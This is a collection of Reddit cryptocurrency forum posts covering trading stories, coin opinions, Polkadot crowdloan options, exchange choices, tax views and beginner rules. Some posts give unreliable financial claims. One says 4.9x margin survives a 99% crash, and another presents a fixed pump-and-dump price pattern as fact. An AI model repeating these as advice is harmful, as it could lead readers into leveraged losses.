I bought my 1st coins this year in February and managed to make about 10x on my investments despite the spring dip. To be onest, I wasn't expecting this but now I have enough to finally get rid of a big bank loan I had for a few years. This was my goal and I'm happy I'm gonna be able to fulfill it.

I noticed one thing though. Doing a dca out is hard and u need to have the balls to put a sell order with a frickin high price cause u never know what will happen overnight. I managed to sell some of my crypto at very sweet unexpected prices, I'll take that as a bonus :)

Going all year on crypto has put a stress on my mind, it has become a sort of addiction, every day was all about reading all kind of data to try to make the best of my decision. In the end, it helped me a lot but it puts a toll and I need to get some rest.

I'll use this as a break from exchanges and websites, I'll probably stay around here lurking the sub for the tech of course.

I'll be back in January, hopefully with a clear head and a lot more patience. I have another goal in my head and it's gonna be one hell of a ride :)

Until then, Happy early Christmas and good luck boys and girls. Thank you for all that I've learned here.

Cheers!

Hi all, some of us might be interested to participate on Futures Trading and Margin Trading that are widely available in many crypto exchanges.

If you do, please note that the risk of liquidation is real and horrible. Since nearly all of the exchanges would go kaput during a crash or major correction, here is 2 tips that might assist you to lower the risk of being liquidated.

1. if you ever do leverage futures trading, make sure never leave any extra fund into the futures account. During liquidation, exchange will wipe out all the remaining asset in your futures account. Best practices is to move-out any remaining fund in Futures Account if you have any active trade on.

2. If you use Margin Account to trade, Always and Always leverage less than half of the maximum amount allowed, this way, during crash you will not be liquidated. Says the exchange allowed Margin up to 10x, make sure you borrow maximum of 4.9x or less. This way, if the crash is at 99%, you will still not trigger the liquidation treshold. 

hope this help.

Best practice : Enter the Margin trade immediately after a big crash.

I'm by no means a pro when it comes to this subject, but I know more than most of my circle of friends (which doesn't mean much).

Earlier this year I read up on some projects and decided Cosmos, Algorand, Filecoin and a few other projects were neat. I hold quite a bit of them, in addition to old reliable Ethereum and Bitcoin.

Now I hear and read more about Ethereum 2.0 and it seems like it will kill all of them. If that's truly the case, is this only the start for ETH? Do I take my profits from those other coins and just start funneling into ETH 2.0 now, continue to take advantage of the staking?

OR

Will ETH 2.0 actually benefit these other projects because they will be able to take advantage of the new features etc.

From what I've seen, this applies to any coin that saw a meteoric rise over a short amount of time due to hype. Such examples are SHIB, DOGELON, LRC and VIKING, though I'm sure there's plenty more.

First it's the initial jump. It happens in a very short amount of time, from seconds to minutes, and it looks like an almost 90 degree angle in the chart. The coin rises hundreds of percent in value. **This** is usually the highest it will rise this particular run, though there are exceptions in which it rises slightly higher the second bounce.

Then comes the first correction when people begin to sell. It's a 45 degree drop, and it usually goes down around 10-20% before it stops. From there, it bounces up and down very little, staying relatively stable for about a day. It's at this point that word starts going around and the second drove of new investors comes in.

Then there's the bounce. It goes up quite significantly again, sometimes surpassing the previous ath, but rarely. This bounce continues for about a day, and then the next dip comes. It'll go down about 10%, then bounce %5 once more, a point of resistance, before the price starts declining.

Then, over the course of about four to six days, price will keep dropping at a slow but constant rate, losing from 25 to 40% of it's value. Why over less than a week? Because it's the perfect amount of time to cause fear and weed out the paperhands. Those who bought near the ath are anxious, and though they promised not to sell they end up doing so around the fourth or fifth day.

This is also when all social media will be flooded with desperate posts of people posting rockets and 'to the moon!' comments. They're scared and want the coin to keep rising so they can get out too.

Then, finally, comes the final bounce.  Once all the fearful ones sell, the price bounces one final time near the ATH, giving people a chance to sell before it goes down around 20-30%. And at that point the trading volume will go down and the coin will remain at around the same price, fluctuating little.

Until the next time around some hype causes it to go uo, and the cycle repeats.

Check the charts for yourself, and see how true this is.

Robinhood is pure garbage as a company and everyone recommend to stay away from it... they even locked the buy button several times and are willing to do again, they care only about how much money THEY make, not you, you're nothing for them.

If you're buying crypto on robinhood you are buying a digital asset that robinhood says is worth the same as the actual crypto, but you are not buying the crypto itself, please DYOR not only about coins but also about exchanges.

Personaly im binance fan, but only when it comes to buying the actual coins.

I always see people talking about crazy gains made in crypto and i don't know where to start to find them. It seems like every time i find one it has already launched and has a multi million dollar market cap. I want to get in before the hype... before the million dollar, hundred thousand dollar, or even the ten thousand dollar market cap!

Can someone give me some tips or tricks they used to achieve these things?

Where do I look to get in projects so early.

Also... how do you find projects that are not a rug? Every time I've been in an early project it seems like the owners just pull all of the liquidity out of the coin before anyone can take profit or take their initial investment out. I'd really like if someone could point me in the right direction of what im doing wrong. I frequently use Kucoin and trade on there but would like to roll some profits from there into some shitcoins. Can anyone give me suggestions?

I've seen people from the slums entering college because they didn't have to pay. Free technical books rentals at uni's libraries, free housing for the poorest students that come from other cities (have to prove income to be eligible), free lunch and dinner (in some unis only, in others you have to pay from 50c to 2 USD, though) and some undergrad research scholarships.

We've got free cancer and AIDS treatments. Free ambulances. I've seen poor, old ladies that sell corn at Sunday's vegetables fair that had a life-changing eye surgery that made them see again. If they had to pay for it, they'd go blind long before their death. FFS there are cochlear implants and organ transplants for free in some cases.

Paying 15%-25% over 10x+ crypto profits? Man, just take it.

I'm not saying there aren't problems. You have to study to be accepted in the universities and if your parents had money in the first place, you could prepare yourself better going to the best private high-schools. The lines for some health procedures are long enough, but if your condition is chronic (AIDS, cancer) or life-threatening (e.g. a car accident), you're assisted on the spot. Violence is still a big thing, mainly due to a huge wealth gap, and hopefully there are people fighting to give better conditions to as many people as possible. Not everything is perfect.

I'm also not saying that all tax money is rightfully used - I'm not such a fool. But I can't imagine living in a country where I had to pay a hefty amount to call an ambulance. If I had to pay for my college degree in the old days, probably I wouldn't have gotten any, as my parents were quite humble.

Being libertarian or communist or capitalist, we live in society, and people tend to forget a good society is one where the maximum amount of people has their basic needs met. 

People also tend to forget that things they take for granted, such as the structures for calling the cops, sewage treatment, electricity on the bulbs, water in the taps etc. are generally paid with taxes. Don't want to pay taxes? Fine, get your own private security, buy yourself a water reservoir and build your own power plant. Might as well declare independence.

Imho, not wanting to pay taxes doesn't put you far away from people in the Pandora and Panama papers. Want to make sure taxes are rightly used? Participate and get engaged in social participation programs. Get involved. Be part of your community.

If you live in a country where there are such social security structures, don't mind paying taxes. If all your neighbors are fed, probably you are fed, too.

TL;DR: I don't mind paying taxes over 10x+ if people around me will be assisted one way or another.

We all love crypto and believe in them. Otherwise, we wouldn't have invested so much money, right? Well.. I sense that there many people in the crypto market that are actually not sure about their choices. Furthermore, I bet many of you don't say about your investments not only because you don't want people to know but because you would not be able to defend arguments about them. It's common knowledge that we mostly know shit about crypto. So please feel free to ask anything you wanna get answered. ** Ask a question that would put you in a difficult position to answer in a conversation with another person. **

Immutable X - the elite L2 Ethereum solution for NFTs.

For the Gods Unchained play-to-earners, and the folks who managed to get into one of the pre-sales (not an easy task) - upon exchange listing, holders saw their IMX tokens spike from .15c to over $7 within minutes.

Its now stabilized between $4-6 and is trading on Huobi Global, OKEx, and Bybit.

This is one of the best, or at least most sought after, ETH L2 protocols in the crypto space. The question is, what price are you willing to get in to buy the dip? 

At a fully diluted market cap of $10billion, based on all the use cases, a $2-4 floor may be a reasonable entry point.
But Im interested in *your thoughts* on its launch day valuation!

Let me open this Idea with a Claim: Most of us will have a hard time to get Moons. Because we're not interesting enough, because we have nothing to tell, because some of us are a little on the dumb side, and some of us barely speak the language, and MOST of us just lurk and can't even dream to get Moons for contributions.  


We're Investors here, right? Or Gamblers. But either way, we like to put our money into investments that grow, or into horses that run the fastest. I'd like to put Moons on Names of good commentors and get a share of the Moons they earn. That will give us passive Moon-Interest without having to come up with something intersting, creative or witty to write which - let's be  honest - is difficult.  


Aaaaaand: Here's the thing. Of all the moons distributed like this, a certain fraction goes into the general pool. So the more people invest, the more moons will be distributed to ALL of us.  


2 questions: Why haven't we done this and where can I receive my Nobel Price for this genius Idea? And I'm serious! We're investors/gamblers. We invest/gamble. So why can't I invest/gamble on Redditors?

I have heard that the way the Squid Games coin scam worked is simple, as far as crypto  goes. It takes advantage of the liquidity pool that exists between the  Squid tokens issued and commensurate tokens (BNB tokens) issued by  Binance, the cryptocurrency exchange. The team behind the Squid Games  coin issued their tokens and held the majority of the supply. That  allowed them to transfer the value of the Squid Games coins into BNB  tokens, which they then stole away. The theft is public, but the  scammers used a mixing and tumbling service called Tornado Cash to try  to obscure their tracks.

But still the problem being unsolved, how could the scammer get that much money and become anonymous in such a developed identity system?

Loopring aka LRC is a decentralized exchange or Dex where you trade using their latest layer 2 solution update 3.8. 
Many have started LRC is nothing but being FOMOed by those how buy meme coins instead. Let me give you some of the best features available in LRC - 

LRC is a layer 2 solution which makes the fees as low as less than a penny using the ETH network 

There are no KYC required for trading in LRC , all you need is a eth wallet address and you can start using LRC

LRC can support upto 2025 trades per second with equal amount of security as the Ethereum block chain gives them

LRC supports NFT miniting and any NFT minted in L2 can be sent to L1 and vice versa for buying them

With LRC one can use to send Crypto to another L2 address and can also withdraw from L1 any of the  Ethereum address
LRC can support upto 4.3B account with its new update which makes it one of the larget Dex out there and LRC provides Flash Loan for its users.

In terms of Tokenomics , LRC has a supply almost 1.4B and has been deflationary as it's burner against its DEX trading fees which makes it more scarce for each trade happening.
Anyone can stake LRC to receive 70% of their trading fees which makes the transaction cost to almost nil.

LRC is currently at 85 in with a 1.7B Mcap which make it very attractive in terms of high growth. Although LRC has run over 2x in last few weeks , it's still early in terms of the technology available with LRC and the Defi that's growing in terms of the whole Crypto. 

This is no financial advice and it's better if everyone do their own dyor but this is just to show LRC is no memecoin but has some real value in its project.
What do you guys think about LRC and do you feel its has run up already or are we still early with LRC

A couple of years ago cryptocurrencies were a rare sighting. And right now every major brand, every sport, everyone wants to jump on board. 

We were here first. We saw the bigger picture when 99% were trashing crypto and naming it the criminals coin. The dark web currency. 

For everyone still reluctant towards crypto, stop focusing on shit meme coins and search for real world applicability. Problem solving. Technological evolution. Thats where the money is. Not right now, but in ten years.

Dont over focus on the ideia that crypto is here to undermine the fiat. Or to help you evade taxes. Look at the bigger picture. Cryptocurrencies are a fresh fruit of globalization. Its the globalization of the currency. The uniformity of the markets. 

Ive said this countless times, to my most dearest friends and family, some already onboard with change, some still reluctant (as one uniformed person should be tbh): 

The future belongs to those who prepare for it today.

Malcom X was right and this quote reflects what is happening right now with crypto. You should be generating your wealth right now, not waiting for everyone to do it and then go about your life thinking if only I had embraced the future before it swept me off my feet. 

Remember to only invest what you can afford to loose. But do it today.

Hello everyone and thank you for your time.

My Metamask desktop on Chrome looks / works perfectly fine; I can see / use both my main wallet and my Ledger wallet: [url=https://www.linkpicture.com/view.php?img=LPic6185408f88ff01600210872][img]https://www.linkpicture.com/q/441CB0A4-2EE0-4B74-A6A5-E34253A76972.jpeg[/img][/url]

I would like my Metamask MOBILE to look EXACTLY the same (if possible). On Mobile I can only see my main wallet and another useless one (which I can't even delete.) here's how it looks on mobile: [url=https://www.linkpicture.com/view.php?img=LPic618540e2b04cc849908473][img]https://www.linkpicture.com/q/4770F38F-A2DC-4682-8BD8-30C878C662F0.jpeg[/img][/url]

Basically I want to get rid of "Account 2" (which I only see it on mobile and not on desktop, don't know why.) and add my Ledger instead. 

I've also tried to delete my Metamask app on mobile and re-install but it keeps showing me the "Account 2" wich is useless and still can't add / import my Ledger.

I've also tried to SYNC my entire account from desktop to mobile but seems to be currently unavailable: [url=https://www.linkpicture.com/view.php?img=LPic61854103b94b5991688477][img]https://www.linkpicture.com/q/83032512-3448-4409-8F9B-CCFF2D6FD303.jpeg[/img][/url]

At least It works on desktop but It's a shame that I cannot see manage my opensea with my ledger on mobile. 

Please help me :(

bubble = when market expectations price in 10 years worth of growth

saw this pic on Twitter and it struck me that even though ppl were right abt the internet, it wld have taken mkt another 10years to reach the peak of the bubble.

I'm no expert but tot i'd share some signs i look out for when gauging how frothy the market is:

* when &gt;90% feel rich. 

They are actually asset-rich but cash-poor. What they think as wealth is actually paper-profits but when demand dries up when many holders are looking for buyers, it will drive down prices, creating panic sell.

&amp;#x200B;

* many are highly leveraged i.e. borrowed money to buy crypto

overextended &amp; will be highly pressured to sell when prices fall somewhat

&amp;#x200B;

* When you see broad bullish sentiments 

it means that most interested participants have already invested what they can invest, reducing buying power in the market

&amp;#x200B;

Please let me know if there are other signals worth taking into acct too!

As many of you might know Polkadot Parachain auctions will start on November 11th.

What many might not know is that the contribution process has already started.

Here is a tweet from the official Polkadot Twitter for reference: 

[https://twitter.com/Polkadot/status/1456355159592812549](https://twitter.com/Polkadot/status/1456355159592812549)

Below I will explain what options you have to contribute your Dot to the Parachain Team's, which option I took and what differntiates the options in Terms of Trust and Rewards.

&amp;#x200B;

* **Option 1: Contribute using the Polkadot.js web app.** 
   * **(Link:** [**https://polkadot.js.org/apps/?rpc=wss%3A%2F%2Frpc.polkadot.io#/parachains/crowdloan**](https://polkadot.js.org/apps/?rpc=wss%3A%2F%2Frpc.polkadot.io#/parachains/crowdloan)**)**
   * Pros: 
      * Using Polkadot.js is one of the most secure ways to contribute.
      * You contribute on chain and no 3rd party will ever hold your Dot
      * Using the website you don't run risk of signing a transaction that is not crowdloan related

&amp;#x200B;

* Cons:
   * Needs the Polkadot.js extension installed
   * While the extension is easy to handle the Website was made for developers and can be overwhelming

&amp;#x200B;

* **Option 2: Contribute using a Website of a Parachain Team.**
   * (Example links: Acala: [https://acala.network/acala/join-acala](https://acala.network/acala/join-acala) // MoonBeam: [https://crowdloan.moonbeam.foundation/](https://crowdloan.moonbeam.foundation/) )
   * Pros: 
      * User friendly interface. Rewards calculations are being shown.
      * If a crowdloan transaction is signed this options is also trustless and no 3rd party will ever hold your dot
      * Some teams offer additional options to contribute here to stay liquid.
      * These option can circumvent the minimum of 5 required dot to contribute (e.g. you can contribute only 1 dot)
      * Extra bonuses like NFTs are possible

&amp;#x200B;

* Cons:
   * Higher chance for impersonating websites
   * A new user might not know if the transaction he is signing is actually for the crowdloan
   * Requires Polkadot.js Extension
   * By using additional options that grand liquidity you will send your tokens to the crowdloan team and trust them to contribute it and return it after 96 weeks.

&amp;#x200B;

* **Option 3: Use centralize exchanges**
   * (E.g. Binance, Kraken, etc)
   * Pros:
      * Convenient participation
      * There might be bonus offers from the exchange
   * Cons:
      * You trust your coins to a 3rd party and dont hold your keys
      * 96 weeks is a long time and a lot can happen to exchanges in that timeframe
      * Exchanges might take a cut from your distribution
      * No NFT distribution

&amp;#x200B;

* **Option 4: Use a mobile/web app/wallet**
   * (E.g. Polkawallet, Talisman, Nova, Math Wallet, Fearless Wallet)
   * Pros:
      * User friendly interface
      * Smart phone comfort
      * Might support NFTs and additional options to distribute (liquid options)

&amp;#x200B;

* Cons:
   * Some people might not be comfortable with a 3rd party app (even if it is open soruce)
   * Might not support all options you would get on the official crowdloan pages
   * Fear of accidently using a phising wallet

**And thats it.**

Those are the 4 options you can use to participate in the crowdloan.

And now to which one I used.

I personally used the option to contribute via the **teams official website**.

I did so by **not giving away my keys** even though that means I am unable to use the liquid offers.

Polkadot.js confusing at the start but I am actually starting to like it.

If you are interested in a tutorial for Polkadot.js contributions I got this tutorial for you:

* [https://www.youtube.com/watch?v=RTCCRVsdzmg](https://www.youtube.com/watch?v=RTCCRVsdzmg)

I do **not** recommend using an exchange because even with good intentions they are a big target for hackers. And of course because you give your keys away. They will probably also take a cut on your contributions (you would have to check back with your exchange).

Now I am wondering which option you choose and why?

Do you have more arguments that I missed? If so please let me know!

I decided to create this thread so that we can learn from everybody mistakes. For example, when I got my first moon from a donation, I just sent it to a random binance adress, thinking it would appear in my balance. Damn how noob I was.  
That was a very little mistake since 1 moon is worth cents. The two things I regret the most are actually selling all my ONE at 0,10$ and all my MANA at 1$, some months ago. Just thinking I could have done an easy 3x just by holding them a couple months, it still hurts me...  


**Tell me your stories,** what was your biggest mistake while a crypto investor, or what do you regret the most during your journey? Let's learn from each other :)

1. Never invest money you will need in a short period of time. This is not a game, so quit playing.
2. Never invest money you will need during an emergency. You might be down at that moment. 
 3. When investing forget about the money you invest. Solid projects go up and down on the daily but on the yearly its mostly up. 
4. Get use to 20-50% drops and months if not years of no sign of life. The faster you get use to this the less stressed you will be.
5. ALWAYS GO AGAINST THE MARKET, by that I mean panic BUY when everyone is panic selling, take profit when everyone is FOMOing in. 
6. Time in the market beats timing the market! Persistence always wins.
7. Everybody is a genius in a bull run. 
8. NEVER SHARE YOUR PRIVATE KEY OR INPUT YOUR 12/24 WORD PHRASE IF YOU ARE ASKED BY ANYONE ANYWHERE.
 9. If you get an email that causes you fear and a heart attack its most likely a scam. ALWAYS DOBLE CHECK THE EMAIL, if its a scam it will be some random email. 
10. NEVER CLICK RANDOM LINKS IN EMAILS! You aint getting shit free in life.
11. If its too good to be true, it most likely is. 
12. Meme coins are a gamble not an investment, always take profit or at least your initial investment. Have something to show for it, rich on paper is not something to be proud of. Life changing money mean nothing if you dont change your life with them.
13. Never chase pumps. You missed it. Its gone. Move on. Dont chase it. You playing with fire. 
14.Never panic sell, there will almost always be a bounce if you want to sell do it then. 
15. (For USA residents) If you sell for profit or switch between cryptos be ready to pay taxes. Yes you can hide it, but remember sooner or later Uncle Sam will get his piece of the pie if not the whole cake. 
16. Always have a nice stack on the side for major dip days. Millionaires are made during bear markets. 
17. The trend is your friend until the end. 
18. Do not leave large funds on an exchange, not your key not your crypto. Go ask those who used mt gox, cryptopia and many other good exchanges.
19. Be prepared to be down or even for at least 2 years, yes even if you are up 1000%, bear markets can be brutal. Ask those who were up in late 2017. 
20. Quality over quantity! Its better to invest big on 5 projects than small on 15 projects. 
21. Dont hate on Bitcoin. It made all this possible. It will remain king no matter what place its in. Its like hating your grandpa for being slower than you. He is the reason you alive in the first place. 

Been in this game since 2016, I know it aint much compared to some other cats on this forum but I believe they would also agree.feel free to add shit I missed.

I have been thinking about this. Interborder transfers seem to be a very obvious usecase. But, I haven't read or know anyone yet who has used it for transferring money overseas. Is it due to taxation? For instance, if I have to transfer say $500 to a friend in US sitting here from India, doing it via Bitcoin is much cheaper as compared to the absurd fees I pay to banks. 

The last two transactions I did in Bitcoin cost me 44 cents and 27 cents. The last fiat international transaction I did, the fees were absurdly high that they make my eyes bleed.  


Is it due to tax issues that we have not seen more people using this medium? Or is it just a lack of awareness or ambiguity around the legality of the mode of payment. What am I missing here?   


Would love to know your thoughts on this?

Listed in order from earliest to most recent. Since 2013 didn't even have 100 coins, I'm listing 2 snapshots for that year, one with the earliest snapshot, another in November. I tried to obtain snapshots on or close to November 5th each year. Due to post character length, proceeding years will be posted in the comments of this post.

Hi all,

sorry if this post is totally wrong here or there are already posts regarding this topic/problem.
But I am new to this reddit thing^^.

So I was in Cryptocurrency way back, when there was the bitcoin, a litecoin and some other altcoins. Etherum was a new thing and everbody loved what you can do there. And that was the point I lost track of what could be done, what new coins and projects came up and what new terms like Defi, minting nfts and so on become the new thing.
Maybe its also because English is not my native language. But I just want to get back, at least a little bit on what is happening. 
How I can start minting or get the info new nfts can get minted or how this process is called^^. 
Or maybe how to sell own work as nfts. How it is working on tron, etherum. What is the deal with the ne Binance Smartchain, why is tron working on linking it, or is tron even somehow on this network. I dunno.
What is the prodigy network in the etherum universe and so on. I was only absent for 2 years or so, but man these changes
So do you guys know how an old man can get back on track?
There are so many sites I even dont know where to start and not get scammed right away.

Thanks for reading this and maybe someone can help?^^

I have had my eyes on Squid Game token for a long time. Haven't looked much into the white paper, but here's the gist of it - **you can't sell**, not for the next 3 years.

Yes, you read that right. This only means one thing. THE ONLY WAY IS UP!!! No selling means no losses. This seems perfect to me. If you're not getting in now, you're literally missing out on a huuuge opportunity.

Edit - 2 hours. My portfolio doubled!!! I literally made thousands of dollars in a couple hours.

Edit 2 - Good morning gents. Guess what? We are in the hundred thousand dollar range. And still going up :D :D. Thank god I took this risk. 

Edit 3 - Holy shit holy shit holy shit. My portfolio is close to a million. MY PORTFOLIO. Which had NEVER seen a hundred thousand. It's now 800 thousand.

Edit 4 - I am now a crypto millionaire. 12 MILLION, to be exact. Tbh, y'all can s\*\*\* my d\*\*\* for doubting my investment, while I browse my yacht catalogue.

Edit - I won't be investing in crypto anymore. It's literally a pyramid scheme - whales manipulating the market and rugpulling us. No thanks to this sub for making me lose all my life's savings.

Edit - Y'all need to get in on ElonSperm. Either that, or you hate making money. See you on the moon.

In light of the recent post stating that this isnt the place to share our political view I decided to keep on the discussion and share another viewpoint. 
Well, I bet most of us over here invested into crypto thinking it is going to bring great change into the world, that being the reason for its value.
It doesnt matter if you are a libertarian like me or a more socialistic kind of person, what matters is that we all are in this together, look at El Salvador, the only country who does not need to bend the knee to big institutions, the only country thats not inflating its citizens wealth away and thats only possible thanks to Bitcoin. 
We can and must disagree on our political ideals as that is how we manage to find the truth behind it all. If you are here today you are most likely just tired of being extorted out of your money by government crooks, it doesnt matter youre a leftie or a rightie, if we can bring the change about (the financial revolution) all of us are going to benefit from it, not just one side of the aisle.

There is a lot of misinformation flying around today about how the crypto tax provisions in the Infrastructure Bill (BIF)  so here is your TLDR of the key provisions. I'll also stick around to answer as many of your crypto tax questions

Super TLDR: the sky isn't falling we'll be OK

Regular TLDR: These provisions are not perfect but they will likely be greatly clarified/limited by Treasury regulations. 

&amp;#x200B;

Let's dig deeper...

There are three crypto tax provisions in the BIF: 

* definition of digital assets 
   * arguably over broad because we wouldn't want airline miles written to a blockchain to be included. I'd expect Treasury regulations to add back the second half of their current definition, which is: used as a medium of exchange. 
* adding digital assets to broker reporting 
   * This is the section 6045 amendment intended to clarify that exchanges need to report trades to their customers on Form 1099. Again, written a bit too expansive. But this is a delegation of authority to Treasury to issue regulations. So, we need to wait for regulations to tell us who is required to report. Based on discussions I've had with officials at Treasury they do not want duplicative reporting in this space so I expect the scope of reporting to be greatly limited. Also, it is very important to note that the law already requires exchanges to report crypto trades under the barter provision. Treasury just wanted this addition to make it perfectly clear they have the authority to require 1099 reporting.  
* adding digital assets to $10,000 cash reporting for businesses 
   * This is what's getting attention today. The big take away here is that it only applies to business transactions, not individuals or investors. Also, much of the "this law cant work" narrative is taken from the existing regulations for cash transaction. It is not an ideal provision but... there will be new regulations... and... it will be workable.

Want to laugh at someone?

First reason: I bought VeChain VET at .21 several months ago, which transferred it to my exodus wallet to keep it off Binance.

I don't watch the market everyday but was thinking about trading a part of my VET, BUT I can't remember my Exodus password. No problem! Get the seed phrase you hand-wrote and have in a safe.

I enter the seed phrase - and then OOF. only 11 words.  
Looks like I forgot to write down one of the 12 words and have now lost access to my Exodus wallet. Luckily, I only have VET on it and my other assets in other wallets.

Welp, expensive mistake, let's hope it doesn't happen again.

Did some research and someone created a bunch of memecoins with all the different japanese dog breeds on ETH around the same time between April - June 2021. Examples: Akita Inu, Shikoku Inu, Hokkaidu Inu, etc. They all have same max token supply. I am assuming its the same anonymous person who created Shiba as well since they have similar characteristics. 

Apparently there are even two memecoins with the same name but on different chains. One is Akita Inu on ETH and the other is Akita Inu on Algo. Talk about confusing.

This seems like an ominous sign for crypto. Its bad enough we have all these memecoins to begin with, but now they cant even come up with original names and marketing? They just copy each other. I see people shilling these coins all the time on here now. What does the community think of these developments?

Has anyone mined Kadena and found the ROI on the ASIC miner they use to be a few months? Less than 3/4 months. I know of a guy that purchased a Goldshell KD5 last month and says he should be able to get his $15k return by end of December/early January. 

I have been mining using GPUs and the Nicehash tool and have been considering buying an ASIC miner and try to get into "serious"mining. I know there is the limitation that these miners can only mine a specific type of crypto. I don't know much about Kadena. Any input and info about this specific crypto?

Hey r/CryptoCurrency,

I'm a 30-something hobby hodler who is relatively new to Crypto looking to up my knowledge game formally. I did a search on the sub and couldn't find anything that directly answered my question so here goes...

Are there any generally accepted continuing education opportunities out there (degrees, certificates, etc.) for people looking to gain literacy in this world? I'm sure there are many people out there questioning whether they made the right career choices for themselves (myself being one of them)

I've had so much fun and genuinely enjoy reading the educational posts users have made here, and while my level of knowledge currently stands somewhere close to "Human attempts to explain theoretical physics to a new-born baby", I'd really like to change that. 

Any answers/help would be greatly appreciated!

Hi,

The way i see it, good things are to be unexpected. I am becoming slightly paranoid. It seems that every article on places like cointelegraph is bullish. Everyone is calling for 100k+ btc before Christmas. And this parabol is just too expected. Dont these extreme runs come out of the blue? Or was it like this during the 2017 bullrun as well?

Dont call me a paperhand please. If i held only btc are wouldnt give a fuck, since in my mind theres virtually a 0% chance that btc wont increase in value in the following years. I Just hold a lot of altcoins and was planning on converting the profits into btc during the bear market.

What are your thoughts? Was it the same during the 2017 bullrun?

Cheers.

Like many of you, I have mastered 'Buy High Sell Low' since the beginning of my crypto career this year. When I sell, coin will start to pump and I am beginning to think I am a genius at this. Now, this is not about begging but if you would like me to pump your coin, I'll hodl it for you and sell it at optimum time so that your coin will start pumping.

\*sigh\*

btw, I have not lost money luckily but obviously not gain optimally...that is the thing. You'll all say 'you can't time the top!' well I can time the bottom for you. How does this work??? lol

Yeah, sounds impossible but it's true. 
I'm an average Joe with average aspirations, get a house, wife, kids, don't get stabbed in a bar fight, don't get seduced by a 15yo who says they're 19, you know the usual stuff. And so far, I've been doing pretty well with these. 

4 years ago I started dabbling with crypto. My first entry into the crypto world is not one I'm proud of, but not ashamed either. Let's just say Carlos Matos wife was correct. After that rug pull I started chasing which ever alt was getting shilled week, BTC was old and slow, yuk! Alts were the future. yep I balls it up every time... but I was hooked! 
During the bear market I learned that BTC was the king as my 100% altcoin portfolio bled 90% losses. But I stayed in the game and I managed to pick up and hold some good coins which have done me very well. (Cough ADA Cough).
I've become somewhat of a BTC Maxi nowadays. I dabble with alts but just to swing trade and increase my BTC bags. 
My BTC bag is now to a point where if BTC fulfills its potential in the next 10 years it'll allow me to retire much earlier, and that's my goal. Just retire early. 
It won't be a lambos, cocaine and hookers retirment but just living a modest life, in a modest house, filling my days with travel and hobbies and that give me pleasure, and to me that's the moon. 

Bitcoin has allowed me to dream the dream that I never thought I would have, financial freedom early enough to still enjoy life. In my dream money is not a problem to my modest life. 
So what is? 

My health, this is now to me my limiting factor. What's the point of making to financial freedom in your 40s if you have a heart attack in your 50s.
Bitcoin has given me Lazer focus to improve my health, i now have a clear picture of what I'm aiming for and I'm very grateful for it. 

Its seems strange to admit, everyone should be looking after their health no matter what. I've always known good health is the most important thing you can have but I've always neglected it. I guess I've just always been focused on mining for Fiat at the 9 to 5. Looking after my self took the back seat in my smooth brain. It's taken magical Internet money to finally or make me realise what important in life. 

I wish you all mad gains. 

Peace bruddas.

I was playing Nintendo switch the other day, like I do sometimes. And beeing a member of the xennial generation, nintendo means playing old school NES games 

I was playing Ninja Gaiden when i dawned on me. We were raised on these games, they had no save function, only one difficulty level (nightmare) and we played them start to finish one by one, we never gave up until we had mastered the game, and when we had mastered it, we tried to speed run it for fun.

And cheat codes were generally regarded as not counting as mastering the game, or for looser n00bs with no skilz.

So for crypto, we have a hard time giving up on a carefully select project until moon (mastering), and we regard meme shit dog coins as cheat codes, for no skill n00bs and the mooning of said coins don't count.

And we have our favorite coins and love making fun of other coins not in our fav list 

Just me? Or am I on to something here?

I have a few good entries on solid projects such as Solana, Ada, Matic however I am still fairly new to this and not sure if I should hold to the next bull market? 

I understand that prices will drop a lot during the bear market but I am not sure how much they can drop. With the rapid growth that is expected to come in the next few months, doesnt that make the support weaker allowing the price to really go low? 

A few of my good entries are:
Solana: $35 
Ada: $1.45 
Matic: $0.90
Luna: $21 

Any opinions appreciated, thanks

The rise of memecoin mania has left me wondering why we haven't seen a coin or coins trying to capitalize on "white-knight" culture.

There seems to be a coin for every theme. The most ridiculous coin names have come. Shib, catgirl, floki, squid... but there is a gapping hole waiting to be filled.

Don't get me wrong, I wouldn't buy any, as I haven't bought into a single one of these memecoins. But it just makes me wonder, would a coin like THOT or THICC drive a madman rally like these others have been able to?

Time in the market is better than timing the market.   

Do not invest more than you can afford to lose.    

Dollar cost average into some of the top 5/10/20 cryptos on a platform that gives you staking or apy.     

Cryptocurrencies are an emergent market where volatility is expected and desired.     

For the foreseeable future BTC and ETH will be the king and queen, who becomes loyal knights princes and princesses can and will be argued to death upon.     

Governmental regulations will change the space, for better and for worse.    

All YouTubers either shill their own bags or just read crypto panic dot com headlines to you for clicks.    

Memecoins are shitcoins and are risky gambles and you shouldnt fomo into anything thats blowing up, except of course r/cc moons because they are the greatest cc there is.    

Dont talk about your hodlings #s with anyone, keep your coins and keys safe to yourself.     

I hope you all relearned these valuable lessons!

I see lots of posts asking for advice about coins/tokens that end up just being a shillfest for peoples lates endeavours or fake accounts, only for the same question to pop up the next day. I was wondering what Exchanges people recommend, the answers should be a lot more fact than opinion based as we arent predicting the future or shilling but hopefully based on past experience.

i have been DCA for a short while on  Kraken, tried Binance but it wasnt for me. Kraken was easy to set up and verify myself, apps look good, are clean and smooth and I really like there overall image to (sorry if thats a little shallow).

Not overly keen on their charts (maybe I have missed some options) but I am not an avid chart watcher.

Am I missing out by sticking to Kraken, should I look at using more than one exchange, am I missing any major features that other exchanges use?

Do you guys think we are currently in alt-season? With Bitcoin trading sideways for the last couple weeks and alt coins pumping could this be alt season? 

I know this is looking awfully similar to what happened in May this year with alts breaking new ATHs just to fall way back down a few days later. Ethereum outperforming Bitcoin, and meme coins having a blow off top.

I hope that it isnt alt-season because that would have been a very short bull run. But the charts are starting to make me think we are still at the beginning of a very massive cycle, or we are at the end of a very small one.

Most of us are in Cryptocurrency for the gains. Yes, some in it for the tech but it's the gains that will eventually follow. One of the main reasons I feel that regulation is necessary because exchanges need to be held accountable for the coins they hold. 

We all keep hearing about the supply shock of Bitcoin and Ethereum and how exchange reserves are at all time lows. However, IMO this would not be a driving factor for upward price movement in these coins. Theoretically thousands of people can buy bitcoin and the exchange reserves can still remain low. The only time this would matter is when the coins are being withdrawn to their non-custodial wallets. 

If government comes up with a regulatory framework, 

*  Exchanges would compulsorily need to keep a minimum percentage of coins in their custody (similar to the fractional reserve system practiced in conventional banking today). 
* With banks being allowed to provide bitcoin to their customers in many countries, there is going to be a large crowd who is going to buy BTC from banks and other financial institutions because they are not tech savvy and do not know how to custody bitcoin themselves. 
* Banks, Exchanges should be subject to proof of on-chain custody of minimum balances as a percentage of their TVL in each crypto they are offering so that the supply shock is actually felt and it reflects on the price.

